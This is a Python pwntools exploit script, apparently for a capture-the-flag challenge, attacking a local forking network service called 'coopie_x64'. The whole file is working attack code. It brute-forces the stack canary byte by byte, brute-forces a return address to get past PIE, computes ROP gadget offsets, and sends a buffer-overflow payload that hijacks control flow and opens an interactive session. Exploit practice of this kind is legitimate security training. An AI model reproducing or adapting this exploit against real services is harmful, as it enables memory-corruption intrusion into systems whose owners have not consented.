#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from subprocess import check_output

# context.log_level = "debug"
elf_filename = "./coopie_x64"
elf = ELF(elf_filename)
libc = elf.libc

# if len(sys.argv) == 1:
#     Io = remote("127.0.0.1", 11003)
#     # pid = Io.pid
# else:
#     Io = remote("192.168.210.11", 11003)
#     pid = 0


def generate_io():
    return remote("127.0.0.1", 11003)


def pidof(name):
    output = check_output(["pidof", name])
    print "[+] pidof %s : %s" % (name, output)
    result = [int(i) for i in output.split(" ")]
    return result


def crack_cannary(cannary):
    if len(cannary) == 8:
        return cannary
    else:
        for i in range(8 - len(cannary)):
            for j in range(0x100):
                if j == 10:
                    continue
                Io = generate_io()
                Io.readuntil("PIE?\n")
                payload = flat([
                    "A" * 72,
                    cannary + chr(j),
                ])
                print "[+] Payload: %r" % (payload)
                Io.sendline(payload)
                try:
                    data = Io.read()
                    print "[+] Found: %s" % (data)
                    if data == "GoodBye!\n":
                        break
                except Exception as e:
                    print e
                Io.close()
            cannary += chr(j)
        return cannary


def crack_base_addr_bypass_pie(known, cannary):
    if len(known) == 8:
        return known
    else:
        for i in range(8 - len(known)):
            for j in range(0xFF, -1, -1):
                if j == 10:
                    continue
                Io = generate_io()
                Io.read()
                payload = flat([
                    "A" * 72,
                    p64(cannary),
                    p64(0),
                ]) + known + chr(j)
                print "[+] Payload: %r" % (payload)
                Io.sendline(payload)
                try:
                    data = Io.read()
                    print "[+] Found: %s" % (data)
                    if "Would you like 64-bit cookie PIE?" in data:
                        break
                except Exception:
                    pass
                Io.close()
            known += chr(j)
        return known


cannary = u64(crack_cannary("\x00\xd4\xa7\x1d\xbd7%\x15"))
somewhere_addr = u64(crack_base_addr_bypass_pie(
    "0ow\xcd\x94U\x00\x00",
    cannary
))

# base_addr = somewhere_addr & 0x0000FFFFFFFFF000
base_addr = somewhere_addr & 0x0000FFFFFFFFF000 - 0x1000
print "[+] cannary: 0x%016x" % (cannary)
print "[+] base_addr: 0x%016x" % (base_addr)


ppppppr_offset = 0x000000000000159A
mmmc_offset = 0x0000000000001580
start_offset = 0x0000000000000E00
output_offset = 0x00000000000014F4

fork_offset = 0x000000000000148F

send_offset = elf.got['send']

send_got_addr = send_offset + base_addr
print "[+] send_got_addr: %s" % (hex(send_got_addr))

Io = remote("127.0.0.1", 11003)
print Io.read()

# payload = flat([
#     "A" * 72,
#     p64(cannary),
#     p64(0),
#     p64(somewhere_addr),
#     p64(0),
#     p64(ppppppr_offset + base_addr),
#     # Stage 1
#     p64(0),  # rbx
#     p64(1),  # rbp
#     p64(send_got_addr),  # r12
#     p64(0),  # r13 (arg2)
#     p64(0),  # r14 (arg1)
#     p64(send_got_addr),  # r15 (arg0)
#     p64(mmmc_offset + base_addr),
#     p64(0),
#     # Stage 2
#     p64(0),  # rbx
#     p64(0),  # rbp
#     p64(0),  # r12
#     p64(0),  # r13 (arg2)
#     p64(0),  # r14 (arg1)
#     p64(0),  # r15 (arg0)
#     p64(start_offset + base_addr),
# ])

# leak_offset = 0x00000000000014FB
# pppr_offset = 0x000000000000159C

pop_rsi_pop_r15_ret_offset = 0x00000000000015a1
pop_rdi_ret_offset = 0x00000000000015a3
leak_offset = 0x0000000000000F54

leave_ret_offset = 0x0000000000000f8c
pop_rbp_ret_offset = 0x0000000000000e60

send_got_offset = 0x0000000000202058

data_section_offset = 0x00000000002020F8

logic_offset = 0x0000000000000F30

payload = flat([
    "A" * 0x48,
    p64(cannary),
    p64(data_section_offset + base_addr),  # saved rbp
    p64(logic_offset + base_addr),
    "BBBBBBBB",
    "CCCCCCCC",
    # p64(leave_ret_offset + base_addr),
    # p64(data_section_offset + base_addr),
    # p64(leave_ret_offset + base_addr),
    # p64(logic_offset + base_addr)
])

# gdb.attach(
#     pidof(elf_filename)[0],
#     gdbscript='b recv\n'
# )

print "[+] Payload: %r" % (payload)

Io.sendline(payload)
Io.interactive()
